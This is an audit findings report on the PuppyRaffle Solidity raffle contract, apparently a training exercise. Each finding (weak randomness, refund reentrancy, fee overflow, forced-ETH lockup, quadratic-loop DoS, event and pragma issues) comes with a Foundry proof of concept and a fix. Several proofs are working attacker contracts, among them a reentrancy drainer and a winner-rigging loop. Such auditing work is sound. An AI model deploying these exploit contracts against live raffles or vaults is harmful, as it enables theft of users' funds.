# 4 puppy raffle audit - Findings Report
## Commit hash: 15c50ec22382bb1f3106aba660e7c590df18dcac

## Protocol Overview 

### PuppyRaffle Protocol

PuppyRaffle is an on-chain raffle system that lets anyone compete for collectible puppy NFTs while the contract autonomously handles entries, randomness, payouts and fee distribution.

1. Entering the Raffle  
Participants call `enterRaffle()` supplying a list of new player addresses and paying `entranceFee` per address. The contract verifies payment, forbids duplicates, records players and accrues a small fee for the protocol.

2. Refunds  
Before a winner is chosen, any player may reclaim their stake through `refund()`, which deletes them from the players array, returns their entrance fee and adjusts the pot.

3. Raffle Cycle & Winner Selection  
The raffle runs for `raffleDuration` seconds after the first entry. Anyone can trigger `selectWinner()` once the timer elapses. A pseudo-random number derived from block data picks an index in `players`; the winner receives the accumulated pot (minus fees) and a freshly minted ERC-721 puppy NFT. `tokenIdToRarity` assigns common, rare or legendary status based on randomness, and `tokenURI()` supplies metadata.

4. Fees & Administration  
Collected fees accumulate in `totalFees` and are withdrawable by anyone to `feeAddress` via `withdrawFees()` when no players are active. The owner can update `feeAddress` with `changeFeeAddress()`.

Overall, PuppyRaffle delivers a simple, self-contained raffle/NFT minting experience secured by Solidity and the Ethereum network.
## High Risk Findings
[H-1]. Randomness issue in PuppyRaffle::selectWinner
[H-2]. Reentrancy issue in PuppyRaffle::refund
## Medium Risk Findings
[M-1]. Integer Overflow issue in PuppyRaffle::selectWinner
[M-2]. Unexpected Eth issue in PuppyRaffle::withdrawFees
[M-3]. DOS issue in PuppyRaffle::enterRaffle
[M-4]. Gas Grief BlockLimit issue in PuppyRaffle::enterRaffle
[M-5]. Timestamp Dependent Logic issue in PuppyRaffle::selectWinner
## Info Risk Findings
[I-1]. Event Consistency issue in PuppyRaffle::selectWinner
[I-2]. Pragma issue in PuppyRaffle::NA


### Number of Findings
- H: 2
- M: 5
- L: 0
- I: 2



# High Risk Findings

## [H-1]. Randomness issue in PuppyRaffle::selectWinner

## Description
The `selectWinner` function uses on-chain data like `msg.sender`, `block.timestamp`, and `block.difficulty` (now `prevrandao`) to determine the winner and the rarity of the NFT. These values are predictable and can be manipulated by an attacker, especially a miner or validator, to guarantee a favorable outcome. A miner can compute the result before including the transaction and choose to only include it in a block where they win. A non-miner attacker can also repeatedly call the function until a favorable `block.timestamp` results in them winning.

## Impact
The raffle's fairness is compromised. A malicious actor can guarantee they win the entire prize pool and mint the rarest NFT, destroying the purpose of the contract and leading to financial loss for all other participants.

## Proof of Concept
1. An attacker (who is also a raffle participant) creates a contract that will call `selectWinner`.
2. This attacker contract first calculates the potential `winnerIndex` using the same formula as `PuppyRaffle` but with its own address as `msg.sender` and the current block's attributes.
3. If the calculated winner is the attacker's contract itself, it proceeds to call `PuppyRaffle.selectWinner()`.
4. If the winner is not the attacker, the transaction is reverted. 
5. The attacker can repeatedly try this until they are selected as the winner. A miner can do this deterministically in a single attempt.

## Proof of Code
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.7;

import {Test, console} from "forge-std/Test.sol";
import {PuppyRaffle} from "../src/PuppyRaffle.sol";

contract Attacker {
    PuppyRaffle puppyRaffle;
    address[] players;

    constructor(PuppyRaffle _puppyRaffle, address[] memory _players) {
        puppyRaffle = _puppyRaffle;
        players = _players;
    }

    function attack() public {
        uint256 winnerIndex = uint256(keccak256(abi.encodePacked(msg.sender, block.timestamp, block.difficulty))) % players.length;
        
        // Only complete the transaction if we are the winner.
        require(players[winnerIndex] == address(this), "Attacker: I am not the winner");

        puppyRaffle.selectWinner();
    }
}

contract RandomnessTest is Test {
    PuppyRaffle puppyRaffle;
    uint256 entranceFee = 1 ether;
    address owner = makeAddr("owner");
    address feeAddress = makeAddr("feeAddress");

    address player1 = makeAddr("player1");
    address player2 = makeAddr("player2");
    address player3 = makeAddr("player3");

    Attacker attacker;

    function setUp() public {
        vm.prank(owner);
        puppyRaffle = new PuppyRaffle(entranceFee, feeAddress, 60); // 60 seconds duration

        address[] memory initialPlayers = new address[](4);
        initialPlayers[0] = player1;
        initialPlayers[1] = player2;
        initialPlayers[2] = player3;

        // Attacker joins the raffle
        attacker = new Attacker(puppyRaffle, new address[](0)); // temporary players array
        initialPlayers[3] = address(attacker);
        
        // Update attacker with final players array
        attacker = new Attacker(puppyRaffle, initialPlayers);

        puppyRaffle.enterRaffle{value: entranceFee * 4}(initialPlayers);
    }

    function testMinerManipulation() public {
        // Fast forward time to end the raffle
        skip(120);

        uint256 initialBalance = address(attacker).balance;

        // A miner can manipulate block attributes or re-order transactions
        // to ensure they call selectWinner when they are chosen.
        // We simulate this by repeatedly calling the attack function until it succeeds.
        vm.prank(address(attacker));
        while(true) {
           try attacker.attack() {
                break; // success!
           } catch {
                // failed, try in next block (simulated by incrementing timestamp)
                skip(12); 
                vm.prank(address(attacker));
           }
        }

        assertEq(puppyRaffle.previousWinner(), address(attacker));
        uint256 prize = entranceFee * 4 * 80 / 100;
        assertEq(address(attacker).balance, initialBalance + prize);
    }
}
```

## Suggested Mitigation
The source of randomness should not be based on predictable on-chain data. Use a Chainlink VRF (Verifiable Random Function) which provides provably fair and verifiable randomness.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.7;

import "@chainlink/contracts/src/v0.8/interfaces/VRFCoordinatorV2Interface.sol";
import "@chainlink/contracts/src/v0.8/vrf/VRFConsumerBaseV2.sol";

// Contract would need to inherit from VRFConsumerBaseV2 and implement fulfillRandomWords

contract PuppyRaffle is VRFConsumerBaseV2 /* ... */ {
    VRFCoordinatorV2Interface COORDINATOR;
    uint64 s_subscriptionId;
    bytes32 keyHash;
    uint32 callbackGasLimit = 100000;
    uint16 requestConfirmations = 3;

    // Other state variables

    // event to signal winner is chosen
    event WinnerSelected(address winner);

    constructor(
        uint64 subscriptionId,
        address vrfCoordinator
        /* other params */
    ) VRFConsumerBaseV2(vrfCoordinator) {
        COORDINATOR = VRFCoordinatorV2Interface(vrfCoordinator);
        s_subscriptionId = subscriptionId;
        // Other initializations
    }

    function selectWinner() external {
        // ... checks
        COORDINATOR.requestRandomWords(
            keyHash, // keyHash
            s_subscriptionId, // subId
            requestConfirmations,
            callbackGasLimit,
            1 // numWords
        );
    }

    function fulfillRandomWords(uint256 /*requestId*/, uint256[] memory randomWords) internal override {
        uint256 winnerIndex = randomWords[0] % players.length;
        address winner = players[winnerIndex];
        // ... rest of the logic (pay winner, mint NFT)
        emit WinnerSelected(winner);
    }
}
```

## [H-2]. Reentrancy issue in PuppyRaffle::refund

## Description
The `refund` function sends ETH to a user before updating the state that tracks their participation. It calls `address(msg.sender).sendValue(entranceFee)` before setting `players[playerIndex] = address(0)`. This violates the Checks-Effects-Interactions pattern. A malicious contract can re-enter the `refund` function from its `receive()` or `fallback()` function, causing the contract to send the refund amount multiple times and draining the funds of other players.

## Impact
An attacker can drain the contract of all ETH held for player refunds. If multiple legitimate players have entered, the attacker can steal their entrance fees.

## Proof of Concept
1. The attacker deploys a contract that will perform the reentrancy attack.
2. The attacker calls `PuppyRaffle.enterRaffle()` to add their contract address to the `players` array.
3. The attacker calls `PuppyRaffle.refund()` with the index of their contract in the `players` array.
4. The `PuppyRaffle` contract sends the `entranceFee` to the attacker's contract.
5. The attacker contract's `receive()` function is triggered, which immediately calls `PuppyRaffle.refund()` again.
6. Because `players[playerIndex]` has not been set to `address(0)` yet, the checks in `refund()` pass again, and another refund is sent.
7. This loop continues until the `PuppyRaffle` contract runs out of funds or gas.

## Proof of Code
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.7;

import {Test, console} from "forge-std/Test.sol";
import {PuppyRaffle} from "../src/PuppyRaffle.sol";

contract ReentrancyAttacker {
    PuppyRaffle public puppyRaffle;
    uint256 public entranceFee;
    uint256 public playerIndex;
    uint256 public attackCount = 0;

    constructor(PuppyRaffle _puppyRaffle, uint256 _entranceFee) {
        puppyRaffle = _puppyRaffle;
        entranceFee = _entranceFee;
    }

    function setIndex(uint256 _index) external {
        playerIndex = _index;
    }

    function attack() external {
        puppyRaffle.refund(playerIndex);
    }

    receive() external payable {
        if (address(puppyRaffle).balance >= entranceFee && attackCount < 5) {
            attackCount++;
            puppyRaffle.refund(playerIndex);
        }
    }
}

contract ReentrancyTest is Test {
    PuppyRaffle puppyRaffle;
    ReentrancyAttacker attacker;
    uint256 entranceFee = 1 ether;
    address owner = makeAddr("owner");
    address feeAddress = makeAddr("feeAddress");
    address player1 = makeAddr("player1");
    address player2 = makeAddr("player2");

    function setUp() public {
        vm.prank(owner);
        puppyRaffle = new PuppyRaffle(entranceFee, feeAddress, 60);
        attacker = new ReentrancyAttacker(puppyRaffle, entranceFee);

        // Legitimate players and attacker enter the raffle
        address[] memory players = new address[](3);
        players[0] = player1;
        players[1] = player2;
        players[2] = address(attacker);
        puppyRaffle.enterRaffle{value: entranceFee * 3}(players);
        attacker.setIndex(2);

        // Fund the attacker contract to pay for gas
        vm.deal(address(attacker), 1 ether);
    }

    function testReentrancyRefund() public {
        uint256 attackerInitialBalance = address(attacker).balance;
        uint256 contractInitialBalance = address(puppyRaffle).balance;

        // Attacker starts the reentrancy attack
        vm.prank(address(attacker));
        attacker.attack();

        console.log("Attacker balance after attack: ", address(attacker).balance);
        console.log("Contract balance after attack: ", address(puppyRaffle).balance);

        // Attacker should have drained more than their own entrance fee.
        // They drain their fee + player1's fee + player2's fee.
        assertEq(address(attacker).balance, attackerInitialBalance + contractInitialBalance);
        assertEq(address(puppyRaffle).balance, 0);
    }
}
```

## Suggested Mitigation
Follow the Checks-Effects-Interactions pattern. Update the state (`players[playerIndex] = address(0)`) *before* sending the Ether. This prevents a re-entrant call from passing the initial checks.

```solidity
function refund(uint256 playerIndex) public {
    address playerAddress = players[playerIndex];
    require(playerAddress == msg.sender, "PuppyRaffle: Only the player can refund");
    require(
        playerAddress != address(0),
        "PuppyRaffle: Player already refunded, or is not active"
    );

    // Effect: Update state BEFORE the interaction
    players[playerIndex] = address(0);

    // Interaction: Send the ETH
    Address.sendValue(msg.sender, entranceFee);

    emit RaffleRefunded(playerAddress);
}
```



# Medium Risk Findings

## [M-1]. Integer Overflow issue in PuppyRaffle::selectWinner

## Description
The state variable `totalFees` is of type `uint64`, which is too small to hold the cumulative fees from multiple raffles, especially if the `entranceFee` is significant. The fee for a single raffle is `(players.length * entranceFee * 20) / 100`. If this `fee` value exceeds the maximum value of a `uint64` (approx. 18.4 ETH), the cast `uint64(fee)` will revert due to Solidity 0.8+'s built-in overflow protection. Even if a single fee fits, the cumulative `totalFees` can easily overflow `uint64`. When `totalFees + uint64(fee)` overflows, the `selectWinner` function will revert, permanently halting the raffle and locking all funds (prize pool and fees) in the contract.

## Impact
If the value stored in `fee` exceeds 2^64-1 or if `totalFees + fee` crosses that limit, the implicit SafeCast (`uint64(fee)`) or the subsequent addition will revert. From that moment on every call to `selectWinner()` reverts, so the raffle can never be concluded again, fees can never be withdrawn and users need to rely on the manual `refund()` path to retrieve their deposits. While user funds are not irretrievably lost, the protocol is put into a permanent denial-of-service state and previously accrued fees become stuck.

## Proof of Concept
1. Deploy `PuppyRaffle` with an `entranceFee` of 1 ether and `raffleDuration` of 1 minute.
2. Prepare an array that contains 100 distinct player addresses.
3. Call `enterRaffle{value: 100 ether}(players)`.
   • fee that will be calculated in `selectWinner` = 100 ether * 20% = 20 ether > 2^64-1 wei (≈18.4 ether).
4. Fast-forward the chain by 2 minutes and call `selectWinner()`.
5. The cast `uint64(fee)` reverts, halting the raffle.
6. Further attempts to call `selectWinner()` keep reverting until contract upgrade, demonstrating a permanent DoS.

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;
import "forge-std/Test.sol";
import {PuppyRaffle} from "../src/PuppyRaffle.sol";

contract TotalFeesOverflow is Test {
    PuppyRaffle raffle;
    address feeReceiver = makeAddr("fee");
    address[] players;

    function setUp() public {
        // create 100 distinct players
        for (uint256 i; i < 100; ++i) {
            players.push(makeAddr(string(abi.encodePacked("p", i))));
        }
        raffle = new PuppyRaffle(1 ether, feeReceiver, 60);
    }

    function testOverflow() public {
        // everyone joins – total msg.value = 100 ether
        raffle.enterRaffle{value: 100 ether}(players);
        skip(120);
        vm.expectRevert();
        raffle.selectWinner();
    }
}

## Suggested Mitigation
Store `totalFees` as `uint256` (or use OpenZeppelin's SafeCast library when down-casting) and keep all fee arithmetic in 256-bit space.

## [M-2]. Unexpected Eth issue in PuppyRaffle::withdrawFees

## Description
The `withdrawFees` function uses a strict equality check `address(this).balance == uint256(totalFees)` to ensure fees can only be withdrawn when no raffle is active. However, it's possible for ETH to be forcibly sent to the contract address (e.g., via `selfdestruct` or a simple transfer from a contract that has no `receive` function). If this happens, `address(this).balance` will become greater than `totalFees`, causing the check to fail permanently. This will lock all accumulated fees in the contract forever.

## Impact
Accumulated fees meant for the project owner or treasury can be permanently locked within the contract. This leads to a direct loss of funds.

## Proof of Concept
An attacker can forcibly inject a tiny amount of ETH with self-destruct so the equality check in withdrawFees() will never hold again:

1. Raffle ends normally, contract balance equals totalFees.
2. Attacker deploys Malicious with 1 wei and immediately self-destructs to PuppyRaffle.
3. Contract balance is now totalFees + 1 wei while totalFees remains unchanged.
4. Owner (or anyone) tries withdrawFees(); the `require(address(this).balance == uint256(totalFees))` fails forever, permanently locking all fees.

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

import "forge-std/Test.sol";
import {PuppyRaffle} from "../src/PuppyRaffle.sol";

contract Malicious {
    constructor() payable {}
    function attack(address target) external {
        selfdestruct(payable(target));
    }
}

contract UnexpectedEthTest is Test {
    PuppyRaffle raffle;
    uint256 constant ENTRANCE_FEE = 1 ether;
    address owner = address(0xABCD);
    address feeAddr = address(0xBEEF);

    function setUp() public {
        vm.deal(owner, 10 ether);
        vm.prank(owner);
        raffle = new PuppyRaffle(ENTRANCE_FEE, feeAddr, 60);

        // prepare 4 distinct players
        address[] memory newPlayers = new address[](4);
        for (uint i; i < 4; i++) {
            address player = address(uint160(i + 1));
            vm.deal(player, ENTRANCE_FEE);
            newPlayers[i] = player;
        }
        raffle.enterRaffle{value: ENTRANCE_FEE * 4}(newPlayers);
        skip(120);
        raffle.selectWinner();
    }

    function testWithdrawFeesDOS() public {
        uint256 fees = raffle.totalFees();
        assertEq(address(raffle).balance, fees);

        // Force-send 1 wei via self-destruct
        Malicious m = new Malicious{value: 1 wei}();
        m.attack(address(raffle));
        assertEq(address(raffle).balance, fees + 1);

        vm.prank(owner);
        vm.expectRevert("PuppyRaffle: There are currently players active!");
        raffle.withdrawFees();
    }
}

## Suggested Mitigation
Avoid strict equality checks on `address(this).balance`. Instead of checking for equality, check that the balance is at least the amount of the fees to be withdrawn: `address(this).balance >= uint256(totalFees)`. Better yet, do not rely on the contract's balance at all for logic. The state of the raffle should be tracked with a state variable (e.g., an enum `RaffleState { OPEN, CALCULATING, CLOSED }`).

```solidity
// In PuppyRaffle.sol

function withdrawFees() external {
    // The original check is brittle
    // require(address(this).balance == uint256(totalFees), "PuppyRaffle: There are currently players active!");
    
    // Better check:
    require(players.length == 0, "PuppyRaffle: There are currently players active!");

    uint256 feesToWithdraw = totalFees;
    totalFees = 0;
    (bool success, ) = feeAddress.call{value: feesToWithdraw}();
    require(success, "PuppyRaffle: Failed to withdraw fees");
}
```

## [M-3]. DOS issue in PuppyRaffle::enterRaffle

## Description
The `enterRaffle` function checks for duplicate players by using a nested loop that iterates through the entire `players` array for each new player added. This results in a computational complexity of O(n*m + m^2) where n is the existing players and m is new players, which simplifies to O(N^2) for the total number of players. As the `players` array grows, the gas cost of calling `enterRaffle` increases quadratically. Eventually, the gas required will exceed the block gas limit, making it impossible for anyone to enter the raffle. This constitutes a Denial of Service vulnerability that can permanently halt the contract's primary functionality.

## Impact
The contract's core function `enterRaffle` will become unusable once a sufficient number of players have joined. No new players can enter, effectively freezing the raffle. This breaks the business logic of the contract.

## Proof of Concept
1. A large number of players join the raffle over time.
2. The `players` array grows to a significant size.
3. A new user attempts to call `enterRaffle`.
4. The nested loops for duplicate checking consume an exorbitant amount of gas.
5. The transaction fails with an 'out of gas' error because it exceeds the block gas limit.
6. No further players can ever join the raffle.

## Proof of Code
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.7;

import {Test, console} from "forge-std/Test.sol";
import {PuppyRaffle} from "../src/PuppyRaffle.sol";

contract GasGriefingTest is Test {
    PuppyRaffle puppyRaffle;
    uint256 entranceFee = 0.1 ether;
    address owner = makeAddr("owner");
    address feeAddress = makeAddr("feeAddress");

    function setUp() public {
        vm.prank(owner);
        puppyRaffle = new PuppyRaffle(entranceFee, feeAddress, 1 days);
    }

    function testEnterRaffleGasCostGrowth() public {
        // Note: This test demonstrates the quadratic gas cost growth.
        // A full DoS would require reaching the block gas limit, which is hard to test deterministically.
        
        uint256 GAS_FOR_10_PLAYERS;
        uint256 GAS_FOR_20_PLAYERS;

        // Scenario 1: Add 10 players
        address[] memory players10 = new address[](10);
        for(uint i=0; i<10; i++) {
            players10[i] = address(new TestPlayer());
        }
        uint256 gasStart1 = gasleft();
        puppyRaffle.enterRaffle{value: entranceFee * 10}(players10);
        GAS_FOR_10_PLAYERS = gasStart1 - gasleft();

        // Scenario 2: Add 10 more players (total 20)
        address[] memory playersNext10 = new address[](10);
        for(uint i=0; i<10; i++) {
            playersNext10[i] = address(new TestPlayer());
        }
        uint256 gasStart2 = gasleft();
        puppyRaffle.enterRaffle{value: entranceFee * 10}(playersNext10);
        GAS_FOR_20_PLAYERS = gasStart2 - gasleft();

        console.log("Gas for first 10 players:", GAS_FOR_10_PLAYERS);
        console.log("Gas for next 10 players (total 20):", GAS_FOR_20_PLAYERS);

        // The gas cost for the second batch should be significantly higher due to the O(n^2) loop
        // checking against a larger existing `players` array.
        assertTrue(GAS_FOR_20_PLAYERS > GAS_FOR_10_PLAYERS * 2);
    }
}

contract TestPlayer{}
```

## Suggested Mitigation
To prevent duplicate entries efficiently, use a mapping to track existing players. A mapping provides O(1) lookup time, which is much more gas-efficient and scalable than looping through an array.

```solidity
// In PuppyRaffle.sol

// Add a mapping to track active players
mapping(address => bool) public isActivePlayer;

function enterRaffle(address[] memory newPlayers) public payable {
    require(
        msg.value == entranceFee * newPlayers.length,
        "PuppyRaffle: Must send enough to enter raffle"
    );
    for (uint256 i = 0; i < newPlayers.length; i++) {
        address player = newPlayers[i];
        // Check for duplicates using the mapping O(1)
        require(!isActivePlayer[player], "PuppyRaffle: Player already in raffle");
        players.push(player);
        isActivePlayer[player] = true;
    }
    // Remove the expensive O(N^2) loop

    emit RaffleEnter(newPlayers);
}

// Remember to update refund() and selectWinner() to reset the mapping
function refund(uint256 playerIndex) public {
    // ... checks
    isActivePlayer[playerAddress] = false; // Reset mapping
    // ...
}

function selectWinner() external {
    // ...
    // When clearing players, you need to clear the mapping as well
    for (uint256 i = 0; i < players.length; i++) {
        isActivePlayer[players[i]] = false;
    }
    delete players;
    // ...
}
```

## [M-4]. Gas Grief BlockLimit issue in PuppyRaffle::enterRaffle

## Description
The `enterRaffle` function iterates through an input array `newPlayers` to add players and then uses a nested loop with O(n^2) complexity to check for duplicates against the existing `players` array. An attacker can exploit this by first populating the `players` array with a large number of entries (potentially over multiple transactions) and then making any subsequent calls to `enterRaffle` prohibitively expensive, causing them to fail due to exceeding the block gas limit. This can permanently prevent new users from joining the raffle, constituting a Denial of Service (DoS) attack.

## Impact
Because the duplicate-detection logic is O(n²), an attacker can pre-fill the `players` array with thousands of addresses. Every subsequent call to `enterRaffle` now performs millions of comparisons and quickly exceeds the block gas limit, causing all further `enterRaffle` transactions in the current round to run out of gas. Until `selectWinner` is executed (which resets the `players` array) no new user can join the raffle, effectively disabling the core functionality for the duration of the round.

## Proof of Concept
1. Attacker creates 2,000 throw-away EOAs and calls `enterRaffle` once with the 2,000 addresses, paying `2000 * entranceFee`.
2. `players.length` is now 2,000.
3. Any call to `enterRaffle` afterwards executes the nested duplicate-check loop which performs ~ (2,000²)/2 ≈ 2,000,000 address comparisons, easily exhausting the 30M gas block limit on main-net → transaction runs out of gas.
4. Consequently no one (including the attacker) can join the raffle again until `selectWinner` is called and the array is cleared. The attacker can repeat the same strategy every round, keeping the raffle permanently closed to new users.

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.18;

import "forge-std/Test.sol";
import "../src/PuppyRaffle.sol";

contract PuppyRaffleGasTest is Test {
    PuppyRaffle raffle;
    uint256 constant FEE = 1 ether;

    function setUp() public {
        raffle = new PuppyRaffle(FEE, address(0xfee), 1 days);
    }

    function _genAddrs(uint256 count, uint256 offset) internal pure returns (address[] memory arr) {
        arr = new address[](count);
        for (uint256 i; i < count; i++) {
            arr[i] = address(uint160(offset + i + 1));
        }
    }

    function _enter(uint256 count, uint256 offset) internal returns (uint256 gasUsed) {
        address[] memory players = _genAddrs(count, offset);
        uint256 gasBefore = gasleft();
        raffle.enterRaffle{value: FEE * count}(players);
        gasUsed = gasBefore - gasleft();
    }

    function test_GasGrowthIsQuadratic() public {
        // first batch of 10 players
        uint256 gas10 = _enter(10, 0);
        // second batch of 20 new players
        uint256 gas20 = _enter(20, 1000);

        // With a linear algorithm doubling the input would at most double the gas.
        // Expect >3x increase, proving quadratic growth and making DoS viable.
        assertGt(gas20, gas10 * 3);
    }
}


## Suggested Mitigation
The duplicate check mechanism should be redesigned to avoid O(n^2) complexity. Instead of iterating through the entire `players` array, use a mapping to track existing players for O(1) lookup. New players should be checked against this mapping before being added.

```solidity
// Add a mapping to track players
mapping(address => bool) public isPlayer;

function enterRaffle(address[] memory newPlayers) public payable {
    require(
        msg.value == entranceFee * newPlayers.length,
        "PuppyRaffle: Must send enough to enter raffle"
    );

    for (uint256 i = 0; i < newPlayers.length; i++) {
        address player = newPlayers[i];
        // Check for duplicates using the mapping
        require(!isPlayer[player], "PuppyRaffle: Duplicate player");
        players.push(player);
        isPlayer[player] = true;
    }
    // The expensive nested loop is no longer needed.

    emit RaffleEnter(newPlayers);
}

// Remember to reset the isPlayer mapping in selectWinner:
function selectWinner() external {
    // ... existing logic

    // Before deleting players, reset the isPlayer mapping for the next round
    for(uint256 i = 0; i < players.length; i++) {
        isPlayer[players[i]] = false;
    }
    delete players;
    // ... rest of the logic
}
```

## [M-5]. Timestamp Dependent Logic issue in PuppyRaffle::selectWinner

## Description
The `selectWinner` function uses a weak source of randomness derived from `msg.sender`, `block.timestamp`, and `block.difficulty` (`prevrandao`). All of these values are predictable or can be influenced by a block-producing miner. A malicious miner who is also a participant can compute the outcome of the raffle before mining a block. They can choose to mine a block only when the predictable "random" number results in them winning the prize pool and the NFT. This undermines the fairness and integrity of the raffle.

## Impact
The raffle is not fair. A miner has a significantly higher chance of winning than a regular user, allowing them to repeatedly drain the prize pool. This compromises the core promise of a random raffle.

## Proof of Concept
1. A malicious validator (who controls block.timestamp within ~13s and decides whether to publish a block) joins the raffle with one address – attacker.
2. When the raffle period is over, the attacker repeatedly simulates
   winnerIndex = uint256(keccak256(abi.encodePacked(attacker, t, d))) % players.length
   where t is a candidate timestamp and d is the already-known prevrandao (exposed in the next block header).
3. If the equation returns attacker’s index, the validator seals the block with that timestamp t and includes a transaction
      attacker.selectWinner();
4. Otherwise, they discard the block and try again with a new timestamp. Because the validator can iterate through the allowed timestamp window and has unlimited retries, they eventually mine a block where attacker is guaranteed to be the winner, siphoning 80 % of the prize pool.
5. Repeating the process every round lets the validator continuously drain the raffle.

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.18;

import "forge-std/Test.sol";
import {PuppyRaffle} from "../src/PuppyRaffle.sol";

contract PuppyRaffle_RandomnessTest is Test {
    PuppyRaffle raffle;
    uint256 constant ENTRANCE_FEE = 1 ether;
    address constant FEE_ADDR = address(0xfee);
    uint256 constant DURATION = 1 days;

    address alice = address(0xA11CE);
    address bob   = address(0xB0B);
    address attacker = address(0xA77A);

    function setUp() public {
        raffle = new PuppyRaffle(ENTRANCE_FEE, FEE_ADDR, DURATION);

        address[] memory players = new address[](3);
        players[0] = alice;
        players[1] = bob;
        players[2] = attacker;
        raffle.enterRaffle{value: ENTRANCE_FEE * players.length}(players);

        // move time so that selectWinner() is callable
        vm.warp(block.timestamp + DURATION + 1);
    }

    function test_MinerCanForceWin() public {
        uint256 startTs = block.timestamp;
        // iterate through 256 possible timestamps a validator could legally use
        for (uint256 i; i < 256; ++i) {
            uint256 candidateTs = startTs + i;
            uint256 idx = uint256(keccak256(abi.encodePacked(attacker, candidateTs, block.difficulty))) % 3;
            if (idx == 2) { // attacker is players[2]
                vm.warp(candidateTs); // validator chooses this timestamp
                vm.prank(attacker);  // validator/attacker calls selectWinner()
                raffle.selectWinner();
                assertEq(raffle.previousWinner(), attacker, "attacker did not win despite crafted block");
                return;
            }
        }
        fail("could not find winning timestamp in search window");
    }
}

## Suggested Mitigation
Do not use on-chain data like `block.timestamp` or `blockhash` for randomness. Use a provably random source such as Chainlink VRF (Verifiable Random Function). This involves a two-step process: requesting a random number from the oracle and then receiving it in a callback function to select the winner, ensuring that no party can predict or influence the outcome.

```solidity
// Example using Chainlink VRF
import "@chainlink/contracts/src/v0.8/interfaces/VRFCoordinatorV2Interface.sol";
import "@chainlink/contracts/src/v0.8/vrf/VRFConsumerBaseV2.sol";

contract PuppyRaffle is ERC721, Ownable, VRFConsumerBaseV2 {
    // ... VRF variables (coordinator, subscriptionId, etc.)

    function requestWinner() external {
        // ... checks like raffle duration and player count
        s_requestId = VRF_COORDINATOR.requestRandomWords(
            keyHash,
            s_subscriptionId,
            requestConfirmations,
            callbackGasLimit,
            numWords
        );
    }

    function fulfillRandomWords(uint256 requestId, uint256[] memory randomWords) internal override {
        require(s_requests[requestId].exists, "request not found");
        uint256 winnerIndex = randomWords[0] % players.length;
        // ... continue with winner selection logic
    }
}
```



# Info Risk Findings

## [I-1]. Event Consistency issue in PuppyRaffle::selectWinner

## Description
Several critical state changes in the contract do not emit events. Specifically, the `selectWinner` function changes `previousWinner`, resets `raffleStartTime`, calculates `totalFees`, and clears the `players` array without emitting a dedicated `WinnerSelected` event. Similarly, `withdrawFees` resets `totalFees` to zero without an event. This lack of event logging makes it difficult for off-chain services, monitoring tools, and users to track the contract's lifecycle and verify its operations.

## Impact
Reduced observability of the contract's operations. Front-ends and other dependent services cannot easily react to important events like a winner being chosen or fees being withdrawn. It also complicates auditing and incident analysis.

## Proof of Concept
1. A raffle round concludes and `selectWinner()` is called.
2. A winner is selected, the prize is sent, and an NFT is minted. The `Transfer` event for the NFT is emitted by the ERC721 contract, but no single event captures all the details of the raffle outcome (winner, prize amount, new raffle start time).
3. A user interface that wants to display "Congratulations to address X, who won Y ETH!" has no event to listen to for this information and must instead rely on polling contract state, which is inefficient.

## Proof of Code
```solidity
// This is a conceptual test. Foundry's `vm.expectEmit` would be used to show an event is *not* emitted,
// but the assertion is on the absence of an event definition and emit statement in the source code.
// The vulnerability is the missing code itself.

// contract source code lacks this:
// event WinnerSelected(address indexed winner, uint256 prizeAmount, uint256 tokenId);

// And this:
// function selectWinner() { ... emit WinnerSelected(winner, prizePool, tokenId); ... }
```

## Suggested Mitigation
Define and emit events for all significant state transitions. Add a `WinnerSelected` event in `selectWinner` and a `FeesWithdrawn` event in `withdrawFees`.

```solidity
// In PuppyRaffle.sol

// ... Event definitions
event WinnerSelected(address indexed winner, uint256 prizeAmount, uint256 indexed tokenId);
event FeesWithdrawn(address indexed feeAddress, uint256 amount);

// ...

function selectWinner() external {
    // ... logic to determine winner, prizePool, tokenId

    (bool success, ) = winner.call{value: prizePool}("");
    require(success, "PuppyRaffle: Failed to send prize pool to winner");

    _safeMint(winner, tokenId);

    emit WinnerSelected(winner, prizePool, tokenId);
}

function withdrawFees() external {
    // ...
    uint256 feesToWithdraw = totalFees;
    totalFees = 0;

    (bool success, ) = feeAddress.call{value: feesToWithdraw}("");
    require(success, "PuppyRaffle: Failed to withdraw fees");

    emit FeesWithdrawn(feeAddress, feesToWithdraw);
}
```

## [I-2]. Pragma issue in PuppyRaffle::NA

## Description
The contract uses a floating pragma `pragma solidity ^0.8.18;`. This allows the contract to be compiled with any compiler version from 0.8.18 up to (but not including) 0.9.0. While this provides some flexibility, it is a best practice to lock the pragma to a specific, audited version (e.g., `pragma solidity 0.8.18;`). Using a floating pragma can lead to unexpected behavior or bugs if the contract is deployed using a newer compiler version that has introduced subtle changes or bugs.

## Impact
The contract might be deployed with a compiler version that has known or unknown bugs, potentially introducing security vulnerabilities that were not present during the audit. It also leads to non-deterministic builds, where the same source code could produce different bytecode.

## Proof of Concept
1. A developer audits the contract with compiler version 0.8.18.
2. Later, the deployment script uses compiler version 0.8.22, which is allowed by `^0.8.18`.
3. Unknown to the developer, version 0.8.22 has a new optimization bug that affects the logic of the contract.
4. The contract is deployed with the vulnerability, even though the source code itself was deemed safe with the original compiler.

## Proof of Code
```solidity
// The vulnerability is in the pragma line itself.
// No test case can 'exploit' this, it's a matter of development and deployment best practice.

// Vulnerable Code:
// pragma solidity ^0.8.18;

// Mitigated Code:
// pragma solidity 0.8.18;
```

## Suggested Mitigation
Lock the pragma to the specific compiler version that was used for testing and auditing the contract. This ensures that the deployed bytecode corresponds exactly to the audited version and prevents accidental introduction of bugs from future compiler updates.

```solidity
// Change this:
pragma solidity ^0.8.18;

// To this:
pragma solidity 0.8.18;
```



